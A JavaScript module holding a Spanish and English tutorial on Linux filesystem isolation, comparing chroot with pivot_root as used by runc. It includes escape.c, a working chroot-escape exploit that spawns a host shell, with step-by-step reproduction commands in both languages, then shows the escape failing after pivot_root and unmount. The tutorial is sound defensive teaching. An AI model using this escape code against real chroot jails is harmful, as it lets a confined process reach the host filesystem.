export default {
  es: `
          <p>El aislamiento de red y procesos que dan los namespaces no sirve de nada si el proceso puede leer <code>/etc/shadow</code> del host o modificar binarios del sistema. Para aislar el filesystem necesitamos cambiar lo que el proceso considera su directorio raíz (<code>/</code>). Linux ofrece dos mecanismos para esto: <code>chroot</code> y <code>pivot_root</code>.</p>

          <h2>chroot: el mecanismo clásico</h2>

          <p><code>chroot(2)</code> es una syscall que cambia el directorio raíz del proceso (y sus hijos) a un directorio arbitrario. Existe desde Unix v7 (1979). Su uso es simple:</p>

          <pre><code># Preparar un rootfs mínimo con Alpine
mkdir /tmp/rootfs
docker export $(docker create alpine) | tar -xC /tmp/rootfs

# Entrar con chroot
sudo chroot /tmp/rootfs /bin/sh

# Dentro del chroot:
ls /          # Ve el rootfs de Alpine, no el del host
cat /etc/os-release  # Alpine Linux</code></pre>

          <p>El proceso cree que <code>/tmp/rootfs</code> es su <code>/</code>. No puede navegar "arriba" con <code>cd /../../../</code> — el kernel bloquea esa travesía.</p>

          <h2>El problema de chroot: no es seguro</h2>

          <p><code>chroot</code> tiene una limitación crítica: <strong>un proceso con <code>CAP_SYS_CHROOT</code> puede escapar</strong>. El <code>cd ..</code> desde la raíz no funciona — el kernel lo bloquea. El ataque real aprovecha que <code>chroot()</code> <em>solo cambia el puntero de directorio raíz; no cierra los file descriptors abiertos</em>. Un FD abierto antes del segundo chroot sigue apuntando a su inode original, fuera del nuevo jail:</p>

          <pre><code>// escape.c — fuente del exploit
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;

int main(void) {
    int fd = open(".", O_RDONLY);      // FD al cwd actual (dentro del jail original)
    mkdir("sub", 0755);
    chroot("sub");                      // Nuevo chroot; el FD sigue apuntando afuera
    fchdir(fd);                         // cwd = el FD → ahora el cwd está "arriba" del nuevo root
    for (int i = 0; i &lt; 1024; i++) chdir("..");  // Subir hasta el / real del host
    chroot(".");                        // Hacer de ese / el nuevo root
    execl("/bin/sh", "sh", NULL);       // Shell con visión del filesystem del host
}</code></pre>

          <p>Para reproducir el escape:</p>

          <pre><code># 0) Referencia: estamos en el host (Ubuntu)
$ cat /etc/os-release | head -1
# PRETTY_NAME="Ubuntu 24.04.4 LTS"        ← punto de partida: host

# 1) En el host, FUERA del chroot: compilar estático y dejar el binario
#    dentro del rootfs. Estático porque Alpine usa musl (distinta libc
#    que Ubuntu/Debian/glibc) y un binario dinámico no resolvería sus
#    símbolos dentro del chroot. En Ubuntu el paquete es libc6-dev.
gcc -static escape.c -o /tmp/rootfs/escape

# 2) Entrar al chroot y ejecutar el binario
sudo chroot /tmp/rootfs /bin/sh
/ # cat /etc/os-release | head -1
# PRETTY_NAME="Alpine Linux v3.23"        ← estás en Alpine (dentro del jail)

/ # ./escape
# (el prompt cambia; el nuevo shell es del host)

$ cat /etc/os-release | head -2
# PRETTY_NAME="Ubuntu 24.04.4 LTS"
# NAME="Ubuntu"                            ← estás en el HOST, fuera del jail

$ exit                                     # cierra el shell del host
/ # cat /etc/os-release | head -1
# PRETTY_NAME="Alpine Linux v3.23"        ← de vuelta en el chroot original</code></pre>

          <p>Este es el motivo por el que OCI / runc no usan <code>chroot</code> en producción — incluso con cero capabilities extra, tener <code>CAP_SYS_CHROOT</code> ya es suficiente.</p>

          <p>Además, <code>chroot</code> solo aisla el filesystem. Los procesos del host siguen visibles (<code>ps aux</code> muestra todo), la red es compartida, y los mounts del host siguen accesibles si el atacante sabe cómo montarlos.</p>

          <h2>pivot_root: el mecanismo de producción</h2>

          <p><code>pivot_root(2)</code> hace algo más robusto: intercambia el directorio raíz actual con uno nuevo, moviendo el antiguo raíz a un directorio especificado. A diferencia de <code>chroot</code>, opera a nivel de mount namespace — el resultado es un cambio real en la tabla de montajes, no solo en el puntero de directorio raíz del proceso.</p>

          <pre><code># El flujo que usa runc:
# 1. Crear un nuevo mount namespace
# 2. Montar el rootfs del contenedor como un bind mount
# 3. Usar pivot_root para hacer ese mount el nuevo /
# 4. Desmontar el viejo / (ahora en /.old_root)
# 5. Hacer rmdir de /.old_root

# Demostración manual:
sudo unshare --mount bash

# Dentro del nuevo mount namespace:
# 1) Propagación privada — requisito del kernel para pivot_root.
#    util-linux lo aplica automático con --mount (default --propagation
#    private); lo mostramos explícito para que el paso que el kernel
#    exige sea visible. Herramientas que llaman unshare(2) sin pasar por
#    util-linux (runc, crun, youki) lo hacen ellas mismas — si se omite,
#    pivot_root falla con "EINVAL: Invalid argument".
mount --make-rprivate /

# 2) Preparar el new_root como bind mount sobre sí mismo
mkdir -p /tmp/newroot
mount --bind /tmp/rootfs /tmp/newroot
cd /tmp/newroot

# 3) Crear el directorio put_old DESPUÉS del bind mount.
#    Si lo creas antes, el bind mount lo oculta y pivot_root falla con
#    "No such file or directory".
mkdir -p .old_root

# 4) pivot_root
pivot_root . .old_root

# OJO: el hash de bash aún apunta a /usr/bin/ls del host. Como Alpine
# tiene ls en /bin/ls, hay que limpiar el cache o usar rutas relativas.
hash -r                 # limpia el cache de comandos del shell
ls /          # Alpine
ls /.old_root # El filesystem original del host

# Desmontar el viejo root (cortar el acceso)
umount -l /.old_root
rmdir /.old_root

ls /          # Solo Alpine. El host desapareció.</code></pre>

          <p>Valida que el escape de chroot <strong>ya no funciona</strong>: con el <code>escape</code> compilado del apartado anterior en el rootfs, ejecútalo aquí:</p>

          <pre><code># Dentro del mount namespace pivot_rooteado (con el viejo root ya umount-ado)
./escape
ls /
# bin  dev  escape  escape.c  etc  home  lib  ...  var   ← sigue siendo Alpine
# El escape falló: no hay tabla de montajes "vieja" a la que llegar con el FD.</code></pre>

          <h2>Por qué pivot_root es superior a chroot</h2>

          <p>La diferencia está en el nivel de la operación. <code>chroot</code> cambia un único campo en el <code>task_struct</code> del proceso — su puntero de directorio raíz — y nada más; la tabla de montajes del kernel queda intacta. Por eso el filesystem del host sigue montado, solo está oculto al proceso, no desmontado. Un FD obtenido <em>antes</em> del segundo <code>chroot</code> te sirve para reconstruir la ruta hacia él: es justo lo que hizo el <code>escape.c</code> que corriste — compiló, se ejecutó y te sacó a Ubuntu.</p>

          <p><code>pivot_root</code> opera un nivel más abajo: reorganiza la tabla de montajes del mount namespace. Mueve el root viejo a un directorio dentro del nuevo, y tú explícitamente haces <code>umount -l</code> sobre ese directorio. Después del <code>umount</code>, el filesystem del host ya no está montado en ninguna parte visible para ese namespace. El mismo <code>escape.c</code> ejecutado ahí dentro se queda atrapado en Alpine: no hay inode del host alcanzable desde la tabla de montajes actual, así que por más FDs que se abran el salto no tiene destino.</p>

          <p>El precio es que <code>pivot_root</code> no se puede llamar desde cualquier contexto. Exige estar en un mount namespace propio (si no, la reorganización afectaría a todo el sistema) y que la propagación del árbol sea privada — los dos pasos que hiciste al inicio con <code>unshare --mount</code> y <code>mount --make-rprivate /</code>.</p>

          <p>Por eso todos los runtimes OCI — <code>runc</code>, <code>crun</code>, <code>youki</code> — usan <code>pivot_root</code>, y solo caen a <code>chroot</code> en entornos restrictivos donde no hay mount namespace disponible. <code>chroot</code> aislado no es una frontera de seguridad; <code>pivot_root</code> + umount sí lo es.</p>

          <h2>Lo que hace runc en la práctica</h2>

          <p>El código de <code>runc</code> (el runtime OCI de referencia) usa <code>pivot_root</code> cuando está disponible, y solo cae a <code>chroot</code> como fallback en entornos muy restrictivos. La secuencia real en pseudocódigo:</p>

          <pre><code>// 1. Crear mount namespace
clone(CLONE_NEWNS)

// 2. Montar el bundle del contenedor
mount(bundlePath, containerRoot, MS_BIND|MS_REC)

// 3. Montar /proc, /dev, /sys del contenedor
mount("proc", containerRoot+"/proc", "proc", ...)
mount("tmpfs", containerRoot+"/dev", "tmpfs", ...)

// 4. pivot_root
chdir(containerRoot)
pivot_root(".", ".old_root")
chdir("/")

// 5. Limpiar el viejo root
umount2(".old_root", MNT_DETACH)
rmdir(".old_root")

// 6. Ahora el proceso vive completamente en el rootfs del contenedor</code></pre>

          <p>El resultado es que el proceso no tiene ninguna referencia al filesystem del host. Ni siquiera un file descriptor abierto puede usarse para navegar al sistema de archivos original.</p>
        `,
  en: `
          <p>The network and process isolation provided by namespaces is useless if the process can read <code>/etc/shadow</code> from the host or modify system binaries. To isolate the filesystem we need to change what the process considers its root directory (<code>/</code>). Linux provides two mechanisms for this: <code>chroot</code> and <code>pivot_root</code>.</p>

          <h2>chroot: the classic mechanism</h2>

          <p><code>chroot(2)</code> is a syscall that changes the root directory of a process (and its children) to an arbitrary directory. It has existed since Unix v7 (1979). Its usage is straightforward:</p>

          <pre><code># Prepare a minimal rootfs with Alpine
mkdir /tmp/rootfs
docker export $(docker create alpine) | tar -xC /tmp/rootfs

# Enter with chroot
sudo chroot /tmp/rootfs /bin/sh

# Inside the chroot:
ls /          # Sees the Alpine rootfs, not the host's
cat /etc/os-release  # Alpine Linux</code></pre>

          <p>The process believes <code>/tmp/rootfs</code> is its <code>/</code>. It cannot navigate "up" with <code>cd /../../../</code> — the kernel blocks that traversal.</p>

          <h2>The problem with chroot: it is not secure</h2>

          <p><code>chroot</code> has a critical limitation: <strong>a process with <code>CAP_SYS_CHROOT</code> can escape</strong>. A plain <code>cd ..</code> from the root does not work — the kernel blocks it. The real attack exploits the fact that <code>chroot()</code> <em>only changes the process's root-directory pointer; it does not close open file descriptors</em>. A file descriptor opened before the second chroot still points to its original inode, outside the new jail:</p>

          <pre><code>// escape.c — exploit source
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;

int main(void) {
    int fd = open(".", O_RDONLY);      // FD to the current cwd (inside the original jail)
    mkdir("sub", 0755);
    chroot("sub");                      // New chroot; the FD still points outside
    fchdir(fd);                         // cwd = the FD → now cwd is "above" the new root
    for (int i = 0; i &lt; 1024; i++) chdir("..");  // Climb up to the host's real /
    chroot(".");                        // Make that / the new root
    execl("/bin/sh", "sh", NULL);       // Shell with full host filesystem visibility
}</code></pre>

          <p>To reproduce the escape:</p>

          <pre><code># 0) Baseline: we are on the host (Ubuntu)
$ cat /etc/os-release | head -1
# PRETTY_NAME="Ubuntu 24.04.4 LTS"        ← starting point: host

# 1) On the host, OUTSIDE the chroot: build statically and drop the binary
#    inside the rootfs. Static because Alpine uses musl (a different libc
#    from Ubuntu/Debian/glibc) and a dynamic binary would not resolve its
#    symbols inside the chroot. On Ubuntu the package is libc6-dev.
gcc -static escape.c -o /tmp/rootfs/escape

# 2) Enter the chroot and run the binary
sudo chroot /tmp/rootfs /bin/sh
/ # cat /etc/os-release | head -1
# PRETTY_NAME="Alpine Linux v3.23"        ← you are in Alpine (inside the jail)

/ # ./escape
# (the prompt changes; the new shell belongs to the host)

$ cat /etc/os-release | head -2
# PRETTY_NAME="Ubuntu 24.04.4 LTS"
# NAME="Ubuntu"                            ← you are on the HOST, outside the jail

$ exit                                     # close the host shell
/ # cat /etc/os-release | head -1
# PRETTY_NAME="Alpine Linux v3.23"        ← back inside the original chroot</code></pre>

          <p>This is why OCI / runc do not use <code>chroot</code> in production — even with no extra capabilities, merely holding <code>CAP_SYS_CHROOT</code> is enough.</p>

          <p>Furthermore, <code>chroot</code> only isolates the filesystem. Host processes are still visible (<code>ps aux</code> shows everything), the network is shared, and host mounts remain accessible if the attacker knows how to mount them.</p>

          <h2>pivot_root: the production mechanism</h2>

          <p><code>pivot_root(2)</code> does something more robust: it swaps the current root directory with a new one, moving the old root to a specified directory. Unlike <code>chroot</code>, it operates at the mount namespace level — the result is a real change in the mount table, not just in the process's root directory pointer.</p>

          <pre><code># The flow used by runc:
# 1. Create a new mount namespace
# 2. Mount the container rootfs as a bind mount
# 3. Use pivot_root to make that mount the new /
# 4. Unmount the old / (now at /.old_root)
# 5. rmdir /.old_root

# Manual demonstration:
sudo unshare --mount bash

# Inside the new mount namespace:
# 1) Private propagation — a kernel requirement for pivot_root.
#    util-linux applies it automatically with --mount (default
#    --propagation private); we show it explicitly so the step the
#    kernel actually requires stays visible. Tools that call unshare(2)
#    without going through util-linux (runc, crun, youki) have to run
#    it themselves — omit it and pivot_root fails with
#    "EINVAL: Invalid argument".
mount --make-rprivate /

# 2) Prepare new_root as a bind mount onto itself
mkdir -p /tmp/newroot
mount --bind /tmp/rootfs /tmp/newroot
cd /tmp/newroot

# 3) Create the put_old directory AFTER the bind mount.
#    Creating it before makes the bind mount hide it and pivot_root
#    fails with "No such file or directory".
mkdir -p .old_root

# 4) pivot_root
pivot_root . .old_root

# NOTE: bash's command hash still points to the host's /usr/bin/ls. Alpine
# keeps ls at /bin/ls, so we must flush the hash or use relative paths.
hash -r                 # clear the shell's command cache
ls /          # Alpine
ls /.old_root # The original host filesystem

# Unmount the old root (cut off access)
umount -l /.old_root
rmdir /.old_root

ls /          # Only Alpine. The host is gone.</code></pre>

          <p>Validate that the chroot escape <strong>no longer works</strong>: with the <code>escape</code> binary compiled in the previous section and placed in the rootfs, run it here:</p>

          <pre><code># Inside the pivot_root'd mount namespace (with the old root already unmounted)
./escape
ls /
# bin  dev  escape  escape.c  etc  home  lib  ...  var   ← still Alpine
# The escape failed: there is no "old" mount table left for the FD to reach.</code></pre>

          <h2>Why pivot_root is superior to chroot</h2>

          <p>The difference is the level at which each operates. <code>chroot</code> changes a single field in the process's <code>task_struct</code> — its root directory pointer — and nothing else; the kernel's mount table is untouched. The host filesystem stays mounted, it is just hidden from the process, not unmounted. A file descriptor captured <em>before</em> the second <code>chroot</code> is enough to rebuild the path back to it: that is exactly what <code>escape.c</code> did when you ran it — it compiled, executed and landed you on Ubuntu.</p>

          <p><code>pivot_root</code> works one layer below: it rearranges the mount table of the mount namespace. It moves the old root into a directory inside the new one, and you explicitly <code>umount -l</code> that directory. After the unmount, the host filesystem is no longer mounted anywhere visible to that namespace. The same <code>escape.c</code> executed there gets stuck in Alpine: there is no host inode reachable from the current mount table, so no number of extra FDs can complete the jump.</p>

          <p>The cost is that <code>pivot_root</code> cannot be called from any context. It requires you to be in a dedicated mount namespace (otherwise the rearrangement would affect the whole system) and that the tree's propagation is private — the two steps you ran at the start with <code>unshare --mount</code> and <code>mount --make-rprivate /</code>.</p>

          <p>That is why every OCI runtime — <code>runc</code>, <code>crun</code>, <code>youki</code> — uses <code>pivot_root</code>, and falls back to <code>chroot</code> only in restricted environments without a mount namespace. Plain <code>chroot</code> is not a security boundary; <code>pivot_root</code> + unmount is.</p>

          <h2>What runc does in practice</h2>

          <p>The <code>runc</code> source code (the reference OCI runtime) uses <code>pivot_root</code> when available, falling back to <code>chroot</code> only in highly restricted environments. The actual sequence in pseudocode:</p>

          <pre><code>// 1. Create mount namespace
clone(CLONE_NEWNS)

// 2. Mount the container bundle
mount(bundlePath, containerRoot, MS_BIND|MS_REC)

// 3. Mount /proc, /dev, /sys for the container
mount("proc", containerRoot+"/proc", "proc", ...)
mount("tmpfs", containerRoot+"/dev", "tmpfs", ...)

// 4. pivot_root
chdir(containerRoot)
pivot_root(".", ".old_root")
chdir("/")

// 5. Clean up the old root
umount2(".old_root", MNT_DETACH)
rmdir(".old_root")

// 6. The process now lives entirely inside the container rootfs</code></pre>

          <p>The result is that the process has no reference whatsoever to the host filesystem. Not even an open file descriptor can be used to navigate back to the original file system.</p>
        `,
};
